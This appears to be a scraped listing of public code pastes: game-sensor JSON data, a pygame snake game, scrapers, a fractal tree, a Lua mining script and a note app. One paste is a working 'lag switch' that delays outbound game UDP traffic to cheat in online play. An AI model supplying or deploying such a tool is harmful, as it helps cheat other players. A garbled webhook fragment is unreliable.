            ""date"": ""2025-03-21 16:00:00"",
            ""value"": 20.97
        },
        {
            ""date"": ""2025-03-21 19:52:31"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 19:55:02"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 16:58:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-21 17:03:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-21 17:08:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-21 17:13:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 17:18:00"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-03-21 17:23:00"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-21 17:28:00"",
            ""value"": 20.93
        },
        {
            ""date"": ""2025-03-21 17:33:00"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-21 17:38:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-21 17:43:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-21 17:48:00"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-21 17:52:00"",
            ""value"": 21.05
        },
        {
            ""date"": ""2025-03-21 18:00:00"",
            ""value"": 21.07
        },
        {
            ""date"": ""2025-03-21 19:00:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-21 20:00:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-21 21:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-03-21 22:00:00"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-03-22 03:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-22 04:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-03-22 05:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-03-22 06:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-03-22 07:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-03-22 08:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-03-22 09:00:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-22 10:00:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-22 11:00:00"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-22 12:00:00"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-22 13:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-22 14:00:00"",
            ""value"": 20.87
        },
        {
            ""date"": ""2025-03-22 15:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-22 16:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-22 17:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-03-22 18:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-03-22 19:00:00"",
            ""value"": 20.55
        },
        {
            ""date"": ""2025-03-22 20:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-22 21:00:00"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-22 22:00:00"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-03-23 03:00:00"",
            ""value"": 19.75
        },
        {
            ""date"": ""2025-03-23 04:00:00"",
            ""value"": 19.66
        },
        {
            ""date"": ""2025-03-23 05:00:00"",
            ""value"": 19.65
        },
        {
            ""date"": ""2025-03-23 06:00:00"",
            ""value"": 19.9
        },
        {
            ""date"": ""2025-03-23 07:00:00"",
            ""value"": 20.17
        },
        {
            ""date"": ""2025-03-23 08:00:00"",
            ""value"": 20.55
        },
        {
            ""date"": ""2025-03-23 09:00:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-23 10:00:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-23 11:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-23 12:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-23 13:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-03-23 14:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-03-23 15:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-03-23 16:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-03-23 17:00:00"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-03-23 18:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-03-23 19:00:00"",
            ""value"": 20.31
        },
        {
            ""date"": ""2025-03-23 20:00:00"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-03-23 21:00:00"",
            ""value"": 20.19
        },
        {
            ""date"": ""2025-03-23 22:00:00"",
            ""value"": 20.14
        },
        {
            ""date"": ""2025-03-24 03:00:00"",
            ""value"": 19.97
        },
        {
            ""date"": ""2025-03-24 04:00:00"",
            ""value"": 19.93
        },
        {
            ""date"": ""2025-03-24 05:00:00"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-03-24 06:00:00"",
            ""value"": 20.05
        },
        {
            ""date"": ""2025-03-24 07:00:00"",
            ""value"": 20.62
        },
        {
            ""date"": ""2025-03-24 08:00:00"",
            ""value"": 21.18
        },
        {
            ""date"": ""2025-03-24 09:00:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-24 10:00:00"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-24 11:00:00"",
            ""value"": 21.7
        },
        {
            ""date"": ""2025-03-24 12:00:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-24 13:00:00"",
            ""value"": 21.61
        },
        {
            ""date"": ""2025-03-24 16:14:02"",
            ""value"": 21.58
        },
        {
            ""date"": ""2025-03-24 16:15:03"",
            ""value"": 21.58
        },
        {
            ""date"": ""2025-03-24 16:20:02"",
            ""value"": 21.56
        },
        {
            ""date"": ""2025-03-24 16:25:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 17:10:02"",
            ""value"": 21.88
        },
        {
            ""date"": ""2025-03-24 17:15:03"",
            ""value"": 21.86
        },
        {
            ""date"": ""2025-03-24 17:20:02"",
            ""value"": 21.77
        },
        {
            ""date"": ""2025-03-25 13:45:02"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-25 13:50:03"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-25 14:00:02"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-25 14:05:15"",
            ""value"": 20.98
        },
        {
            ""date"": ""2025-03-25 14:10:03"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-25 14:30:02"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-03-25 14:45:02"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-25 14:50:02"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-25 14:55:02"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-25 15:15:07"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-27 14:10:03"",
            ""value"": 22.36
        },
        {
            ""date"": ""2025-03-27 14:12:19"",
            ""value"": 22.28
        },
        {
            ""date"": ""2025-03-27 14:15:03"",
            ""value"": 22.3
        },
        {
            ""date"": ""2025-03-27 14:21:15"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-27 14:22:54"",
            ""value"": 22.1
        },
        {
            ""date"": ""2025-03-27 14:25:03"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-27 14:30:03"",
            ""value"": 22.0
        },
        {
            ""date"": ""2025-03-28 15:33:06"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-03-28 15:35:03"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-03-28 12:34:00"",
            ""value"": 21.47
        },
        {
            ""date"": ""2025-04-04 10:30:02"",
            ""value"": 13.99
        },
        {
            ""date"": ""2025-04-04 07:43:00"",
            ""value"": 14.47
        },
        {
            ""date"": ""2025-04-04 11:20:02"",
            ""value"": 15.85
        },
        {
            ""date"": ""2025-04-04 18:40:03"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-04-04 18:55:02"",
            ""value"": 20.41
        },
        {
            ""date"": ""2025-04-04 19:20:02"",
            ""value"": 19.72
        },
        {
            ""date"": ""2025-04-04 19:25:03"",
            ""value"": 19.57
        },
        {
            ""date"": ""2025-04-04 19:30:03"",
            ""value"": 19.43
        },
        {
            ""date"": ""2025-04-04 16:40:00"",
            ""value"": 19.11
        },
        {
            ""date"": ""2025-04-04 16:50:00"",
            ""value"": 18.81
        },
        {
            ""date"": ""2025-04-04 17:41:00"",
            ""value"": 19.66
        },
        {
            ""date"": ""2025-04-04 18:11:00"",
            ""value"": 20.11
        },
        {
            ""date"": ""2025-04-04 18:20:00"",
            ""value"": 20.24
        },
        {
            ""date"": ""2025-04-04 19:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-04-04 20:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-04 21:00:00"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-04-04 22:00:00"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-04-04 23:00:00"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-04-05 00:00:00"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-04-05 01:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-04-05 02:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 03:00:00"",
            ""value"": 20.77
        },
        {
            ""date"": ""2025-04-05 04:00:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-04-05 05:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-04-05 06:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-05 08:00:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-04-05 09:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-04-05 10:00:00"",
            ""value"": 20.79
        },
        {
            ""date"": ""2025-04-05 11:00:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-04-05 12:00:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-04-05 13:00:00"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-04-05 14:00:00"",
            ""value"": 20.83
        },
        {
            ""date"": ""2025-04-05 15:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 16:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-05 17:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-05 18:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-04-05 19:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-05 20:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-04-05 21:00:00"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-04-05 22:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-04-05 23:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-04-06 00:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-04-06 01:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-04-06 02:00:00"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-04-06 03:00:00"",
            ""value"": 20.33
        },
        {
            ""date"": ""2025-04-06 04:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-04-06 05:00:00"",
            ""value"": 20.29
        },
        {
            ""date"": ""2025-04-06 06:00:00"",
            ""value"": 20.32
        },
        {
            ""date"": ""2025-04-06 07:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-06 08:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-04-06 09:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-06 10:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-04-06 11:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-06 12:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-06 13:00:00"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-04-06 14:00:00"",
            ""value"": 20.79
        },
        {
            ""date"": ""2025-04-06 15:00:00"",
            ""value"": 20.76
        },
        {
            ""date"": ""2025-04-06 16:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-06 17:00:00"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-04-06 18:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-04-06 19:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-04-06 20:00:00"",
            ""value"": 20.58
        },
        {
            ""date"": ""2025-04-06 21:00:00"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-04-06 22:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-04-06 23:00:00"",
            ""value"": 20.5
        },
        {
            ""date"": ""2025-04-07 00:00:00"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-04-07 01:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-04-07 02:00:00"",
            ""value"": 20.44
        },
        {
            ""date"": ""2025-04-07 03:00:00"",
            ""value"": 20.42
        },
        {
            ""date"": ""2025-04-07 04:00:00"",
            ""value"": 20.38
        },
        {
            ""date"": ""2025-04-07 05:00:00"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-04-07 06:00:00"",
            ""value"": 20.33
        },
        {
            ""date"": ""2025-04-07 07:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-04-07 08:00:00"",
            ""value"": 17.78
        },
        {
            ""date"": ""2025-04-07 09:00:00"",
            ""value"": 14.9
        },
        {
            ""date"": ""2025-04-07 12:23:10"",
            ""value"": 16.04
        },
        {
            ""date"": ""2025-04-07 12:25:02"",
            ""value"": 16.04
        },
        {
            ""date"": ""2025-04-07 09:28:00"",
            ""value"": 16.29
        },
        {
            ""date"": ""2025-04-07 09:38:00"",
            ""value"": 16.77
        },
        {
            ""date"": ""2025-04-07 13:25:02"",
            ""value"": 19.36
        },
        {
            ""date"": ""2025-04-07 13:30:03"",
            ""value"": 19.73
        }
    ]
}"
vp9YMsTj,gra.py,black_duck11,Python,Wednesday 28th of May 2025 09:53:02 AM CDT,"import pygame
from Kierunek import Kierunek
from Waz import Waz
from jablko import Jablko
pygame.init()#inicjalizacja modułu

SZEROKOSC=800
WYSOKOSC=608
#tworzenie ekranu o określonych wymiarach
ekran=pygame.display.set_mode((SZEROKOSC,WYSOKOSC))
tlo=pygame.Surface((SZEROKOSC,WYSOKOSC))
waz=Waz()
jablko=Jablko()
jablka=pygame.sprite.Group()
jablka.add(jablko)
PORUSZ_WEZEM=pygame.USEREVENT+1
pygame.time.set_timer(PORUSZ_WEZEM,200)

#nadanie oknu nazwy
pygame.display.set_caption('Pierwsza gra')

clock=pygame.time.Clock()
for i in range(25):
    for j in range(19):
        obraz=pygame.image.load('images/background.png')
        tlo.blit(obraz,(i*32,j*32))

def load_image(sciezka_do_pliku, pozycja):
    #surface-powierzchnia dla grafiki
    image=pygame.image.load(sciezka_do_pliku)
    surface=image.convert()
    #pozycja wyświetlania obiektu jest zapisana w rect
    rect=surface.get_rect(center=pozycja)
    return [surface,rect]





status_gry=True
while status_gry:
    #pobieranie wszystkich zarejestrowanych zdarzeń
    zdarzenia=pygame.event.get()
    for zdarzenie in zdarzenia:
        #sprawdzenie czy kliknięto na X
        if zdarzenie.type==pygame.QUIT:
            status_gry=False
        elif zdarzenie.type==pygame.KEYDOWN:
            if zdarzenie.key==pygame.K_ESCAPE:
                status_gry=False
            if zdarzenie.key == pygame.K_w:
                waz.zmien_kierunek(Kierunek.GORA)
            if zdarzenie.key == pygame.K_s:
                waz.zmien_kierunek(Kierunek.DOL)
            if zdarzenie.key == pygame.K_a:
                waz.zmien_kierunek(Kierunek.LEWO)
            if zdarzenie.key == pygame.K_d:
                waz.zmien_kierunek(Kierunek.PRAWO)
        elif zdarzenie.type==PORUSZ_WEZEM:
            waz.aktualizuj()
  
    ekran.blit(tlo, (0, 0))
    for jablko in jablka:
        ekran.blit(jablko.obraz,jablko.rect)
    ekran.blit(waz.obraz,waz.rect)
    #odświeżenie okna
    pygame.display.update()
    

    clock.tick(60)



    
        
"
DRXGa09b,Packet Lag Switch,peachyontop,Python,Wednesday 28th of May 2025 09:52:47 AM CDT,"import pydivert
import time

DELAY_MS = 200
DELAY_SECONDS = DELAY_MS / 1000
LIMIT = 20
FILTER = ""outbound and udp and udp.DstPort == 27015""

queue = []

with pydivert.WinDivert(FILTER) as w:
    print(f""[*] Fake lag active ({DELAY_SECONDS:.3f} sec) with packet limit {LIMIT}..."")

    while True:
        try:
            packet = w.recv()
            send_time = time.time() + DELAY_SECONDS
            queue.append((send_time, packet))
        except Exception as e:
            print(f""Recv error: {e}"")

        now = time.time()
        ready_packets = [p for p in queue if p[0] <= now]
        queue = [p for p in queue if p[0] > now]

        for _, pkt in ready_packets:
            try:
                w.send(pkt)
            except Exception as e:
                print(f""Send error: {e}"")

        if len(queue) >= LIMIT:
            _, pkt = queue.pop()
            try:
                w.send(pkt)
            except Exception as e:
                print(f""Send error: {e}"")

        time.sleep(0.001)"
VLz85xBg,Peachy WebHook Auth,peachyontop,Julia,Wednesday 28th of May 2025 09:49:41 AM CDT,"[ Peachy webhook ] Started with params: ' + value);     var result = {             'tags': {                 'endpoint': 'peachy'             }         },         params = JSON.parse(value),         req = new HttpRequest(),         fields = {},         resp;     if (params.HTTPProxy) {         req.setProxy(params.HTTPProxy);

"
sAx7kA3T,C++ Web Scraper [ More Efficient ],peachyontop,C++,Wednesday 28th of May 2025 09:44:58 AM CDT,"#include <iostream>
#include <string>
#include <curl/curl.h>
#include <gumbo.h>

// Callback function for libcurl
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// Function to fetch webpage content
std::string fetchHTML(const std::string& url) {
    CURL* curl = curl_easy_init();
    std::string htmlContent;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    return htmlContent;
}

// Function to parse HTML and extract `<title>` tag
void extractTitle(const std::string& html) {
    GumboOutput* output = gumbo_parse(html.c_str());
    GumboNode* root = output->root;

    if (root->type == GUMBO_NODE_ELEMENT) {
        GumboVector children = root->v.element.children;

        for (size_t i = 0; i < children.length; ++i) {
            GumboNode* child = (GumboNode*)children.data[i];
            if (child->type == GUMBO_NODE_ELEMENT && child->v.element.tag == GUMBO_TAG_TITLE) {
                std::cout << ""Page Title: "" << child->v.element.children.data[0] << std::endl;
                break;
            }
        }
    }

    gumbo_destroy_output(&kGumboDefaultOptions, output);
}

int main() {
    std::string url = ""https://example.com"";
    std::string html = fetchHTML(url);
    
    if (!html.empty()) {
        extractTitle(html);
    } else {
        std::cout << ""Failed to fetch the webpage!"" << std::endl;
    }

    return 0;
}"
5QP7FwBh,Fractal Tree,peachyontop,C#,Wednesday 28th of May 2025 09:44:00 AM CDT,"using System;
using System.Drawing;
using System.Windows.Forms;

public class FractalTreeForm : Form
{
    private Bitmap canvas;

    public FractalTreeForm()
    {
        this.Width = 800;
        this.Height = 600;
        canvas = new Bitmap(this.Width, this.Height);
        this.Paint += new PaintEventHandler(DrawTree);
    }

    private void DrawTree(object sender, PaintEventArgs e)
    {
        using (Graphics g = Graphics.FromImage(canvas))
        {
            g.Clear(Color.White);
            DrawBranch(g, this.Width / 2, this.Height - 50, -90, 100, 10);
        }
        e.Graphics.DrawImage(canvas, 0, 0);
    }

    private void DrawBranch(Graphics g, float x, float y, float angle, float length, int depth)
    {
        if (depth == 0) return;

        float x2 = x + (float)(length * Math.Cos(angle * Math.PI / 180));
        float y2 = y + (float)(length * Math.Sin(angle * Math.PI / 180));

        g.DrawLine(Pens.Black, x, y, x2, y2);

        DrawBranch(g, x2, y2, angle - 30, length * 0.7f, depth - 1);
        DrawBranch(g, x2, y2, angle + 30, length * 0.7f, depth - 1);
    }

    [STAThread]
    static void Main()
    {
        Application.Run(new FractalTreeForm());
    }
}"
mKtJLwvM,Python Web Scrape,peachyontop,Python,Wednesday 28th of May 2025 09:39:30 AM CDT,"import requests
from bs4 import BeautifulSoup

url = ""https://ADDURL""

response = requests.get(url)

if response.status_code == 200:
    # Parse the HTML content
    soup = BeautifulSoup(response.text, ""html.parser"")

    paragraphs = soup.find_all(""p"")
    for p in paragraphs:
        print(p.text)
else:
    print(f""Failed to retrieve the webpage. Status code: {response.status_code}"")


[Required]
pip install beautifulsoup4 requests"
4tX7wjVp,INSTALL CARBONIO ON UBUNTU22,Templario_7777,Bash,Wednesday 28th of May 2025 09:30:06 AM CDT,"INSTALACIÓN DE CARBONIO/ZIMBRA UBUNTU 22.04

"
vL7fVxCD,Untitled,kirzecy670,MySQL,Wednesday 28th of May 2025 09:03:16 AM CDT,"CASE
    WHEN dateDiff('day', full_reg_datetime, date_of_action) = 0 THEN 'A. 0 Day'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) = 1 THEN 'B. 1 Day'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 7 THEN 'C. 2-7 Day'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 30 THEN 'D. 8-30 Day'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 89 THEN 'E. 2-3 month'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 179 THEN 'F. 4-6 month'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 364 THEN 'G. 7-12 month'
    WHEN dateDiff('day', full_reg_datetime, date_of_action) <= 729 THEN 'H. 1-2 years'
    ELSE 'I. > 2 years'
END AS registration_age_group"
P5uirn1i,tunel,DmDepression,Lua,Wednesday 28th of May 2025 08:52:53 AM CDT,"-- tunnel2x1_return.lua

-- Parâmetros
local length       = tonumber(arg[1]) or 256      -- comprimento em blocos
local fuelSlot     = 1                           -- slot com combustível
local minFuel      = 100                         -- nível mínimo de fuel antes de refuel
-- ===============================================

-- Estado de posição/orientação
local x, y, z = 0, 0, 0      -- coordenadas relativas (começando em 0,0,0)
local dir = 0               -- 0 = norte, 1 = leste, 2 = sul, 3 = oeste

local directions = { ""Norte"", ""Leste"", ""Sul"", ""Oeste"" }

-- Refuel se precisar
local function refuelIfNeeded()
  turtle.select(fuelSlot)
  if turtle.getFuelLevel() < minFuel then
    if not turtle.refuel() then
      error(""❌ Sem combustível no slot ""..fuelSlot.."", abortando."")
    else
      print(""🔋 Reabastecido. Fuel agora:"", turtle.getFuelLevel())
    end
  end
end

-- Move para frente com dig e atualiza x/z
local function forwardSafe()
  refuelIfNeeded()
  while not turtle.forward() do
    turtle.dig()
    os.sleep(0.5)
  end
  -- atualiza coords
  if dir == 0 then z = z - 1
  elseif dir == 1 then x = x + 1
  elseif dir == 2 then z = z + 1
  elseif dir == 3 then x = x - 1
  end
end

-- Sobe um bloco e atualiza y
local function upSafe()
  refuelIfNeeded()
  while not turtle.up() do
    turtle.digUp()
    os.sleep(0.5)
  end
  y = y + 1
end

-- Desce um bloco e atualiza y
local function downSafe()
  refuelIfNeeded()
  while not turtle.down() do
    turtle.digDown()
    os.sleep(0.5)
  end
  y = y - 1
end

-- Gira à direita
local function turnRight()
  turtle.turnRight()
  dir = (dir + 1) % 4
end

-- Gira à esquerda
local function turnLeft()
  turtle.turnLeft()
  dir = (dir + 3) % 4
end

-- Executa o túnel 2x1: camada de altura 2, largura 1
local function digTunnel2x1()
  -- bloco de baixo
  turtle.dig()
  forwardSafe()
  -- bloco de cima
  turtle.digUp()
  upSafe()
  downSafe()
end

-- Retorna ao início seguindo os passos inversos
local function returnToStart()
  print(""🔄 Retornando ao ponto inicial..."")
  -- faz um caminho em Z e X
  -- primeiro ajusta Z
  if z ~= 0 then
    -- se precisar ir para norte/sul
    local targetDir = (z < 0) and 0 or 2
    while dir ~= targetDir do turnRight() end
    for i = 1, math.abs(z) do forwardSafe() end
  end
  -- depois X
  if x ~= 0 then
    local targetDir = (x > 0) and 1 or 3
    while dir ~= targetDir do turnRight() end
    for i = 1, math.abs(x) do forwardSafe() end
  end
  -- e por fim ajusta Y
  while y > 0 do downSafe() end
  while y < 0 do upSafe() end

  print(string.format(""🏁 Chegou! Coordenadas: (0,0,0), direção inicial: %s"", directions[1 + tonumber(arg[2] or 0)]))
end

-- --- Início da execução ---
-- O usuário deve SE POSICIONAR onde quer que seja o ponto 0,0,0
-- e VIRAR para a direção que deseja minerar.
local initialDir = dir
print(string.format(""▶ Iniciando túnel 2×1 de %d blocos"", length))
print(string.format(""📍 Ponto inicial registrado em (0,0,0), direção: %s"", directions[1 + dir]))

-- Faz o túnel
for i = 1, length do
  digTunnel2x1()
end

-- Retorna
returnToStart()
"
X2GaJvPZ,2025-05-28T15:28:42.656844,powerampache,PHP,Wednesday 28th of May 2025 08:28:43 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to localhost/127.0.0.1:80"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to localhost/127.0.0.1:80\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to localhost/127.0.0.1:80\"" }"",""stackTrace"":[]}"
AZT2T3aj,vector_todo.cpp,DrAungWinHtut,C++,Wednesday 28th of May 2025 08:27:48 AM CDT,"
#include <iostream>
#include <fstream>
#include <string>
#include<stdlib.h>
#include<vector>

std::vector<std::string> notes; // Vector to store notes
int noteCount = 0;

// Add new note
void addNote() {
    std::string note;
    std::cout << ""Enter new note: "";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    getline(std::cin, note);
	if (note.empty()) {
		std::cout << ""Note cannot be empty.\n"";
		return;
	}	
    notes.push_back(note); // Store the note in the vector
    noteCount++;
    std::cout << ""Note added.\n"";
}


// Review all notes
void reviewNotes() {
    if (noteCount == 0) {
        std::cout << ""No notes to show.\n"";
        return;
    }
    for (int i = 0; i < notes.size(); i++) {
        std::cout << i + 1 << "". "" << notes[i] << ""\n"";
    }
}


// Edit a note
void editNote() {
    reviewNotes();
    std::cout << ""Enter note number to edit: "";
    int index;
    std::cin >> index;
    if (index < 1 || index > noteCount) {
        std::cout << ""Invalid note number.\n"";
        return;
    }
    std::cout << ""Enter new content: "";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    getline(std::cin, notes[index - 1]);
    std::cout << ""Note updated.\n"";
}


// Delete a note
void deleteNote() {
    if (noteCount == 0) {
        std::cout << ""No notes to delete.\n"";
        return;
    }
    reviewNotes();
    std::cout << ""Enter note number to delete: "";

    int index;
    std::cin >> index;

    if ( index < 1 || index > noteCount) {
		std::cout << ""Invalid note number.\n"";
        return;
    }
	notes.erase(notes.begin() + index - 1); // Remove the note from the vector
    noteCount = noteCount - 1;
    std::cout << ""Note deleted.\n"";

}



// Main menu
int main() {
    int choice;
    do {
		system(""cls""); // Clear the console
		std::cout << ""--- NOTE TAKING APP ---\n"";
        std::cout << ""1. New Note\n"";
        std::cout << ""2. Review Notes\n"";
        std::cout << ""3. Edit Note\n"";
        std::cout << ""4. Delete Note\n"";
        std::cout << ""0. Exit\n"";
        std::cout << ""Choose an option: "";
        std::cin >> choice;

        system(""cls""); // Clear the console
        switch (choice) {
        case 1: addNote(); break;
        case 2: reviewNotes(); break;
        case 3: editNote(); break;
        case 4: deleteNote(); break;
        case 0: std::cout << ""Goodbye!\n""; break;
        default: std::cout << ""Invalid choice.\n""; break;
        }
		system(""pause""); // Pause the console to see the output
    } while (choice != 0);
    return 0;
}"
mJGg95Us,Marquee-JS,dugalcedo,JavaScript,Wednesday 28th of May 2025 07:34:23 AM CDT,"
function createInfiniteImageMarquee(selector, options = {}) {
    // Find parent element
    const parentElement = document.querySelector(selector)

    // default options
    const {
        height = ""200px"",
        gap = 0,
        speed = 2000
    } = options

    // parent styles
    parentElement.style.maxWidth = '100%'
    parentElement.style.overflowX = 'hidden'
    parentElement.style.minHeight = height
    parentElement.style.position = 'relative'

    // get image elements and urls
    const images = [...parentElement.querySelectorAll(':scope > img')]
    const urls = images.map(img => img.src)

    const length = images.length
    const imgWidth = 100/(length-1)

    // delete contents
    parentElement.innerHTML = """"

    const createImg = (i, start = i) => {
        // Define element and attributes
        const img = document.createElement('img')
        img.classList.add('marquee-img')
        const url = urls[i]
        img.src = url

        // Styles
        img.style.height = height
        img.style.width = imgWidth + ""%""
        img.style.objectFit = ""cover""
        img.style.position = 'absolute'
        img.style.top = '0px'
        const leftMargin = gap * start
        img.style.left = `calc(${(imgWidth*start) + '%'} + ${leftMargin}px)`
        const transition = speed * (start+1)
        img.style.transition = transition + 'ms linear'
    
        // append to parent
        parentElement.append(img)

        // move
        requestAnimationFrame(() => {
            // Simply accessing this property forces the browser to re-register the image's position?
            // I'm not sure why
            img.offsetWidth

            img.style.left = (-imgWidth) + '%'
            setTimeout(() => {
                createImg(i, length-1)
                img.remove()
            }, transition);
        })
